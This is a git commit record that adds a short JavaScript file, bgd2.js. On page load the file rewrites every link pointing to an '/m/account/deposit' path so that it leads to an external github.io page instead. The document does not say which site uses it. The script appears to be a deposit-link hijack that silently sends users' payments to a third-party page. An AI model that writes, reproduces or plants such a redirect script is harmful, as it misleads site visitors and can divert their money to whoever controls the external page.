86a7b9ae8a9018c39200c67a70134e8c296de405
inggarfi <inggarsaput@gmail.com>
2025-11-02 11:30:03 +0700

    Create bgd2.js

---
+++ bgd2.js
@@ -0,0 +1,5 @@
+document.addEventListener("DOMContentLoaded", function () {
+  document.querySelectorAll('a[href*="/m/account/deposit"]').forEach(link => {
+    link.href = "https://inggarfi.github.io/depoyukbos/ayok/";
+  });
+});
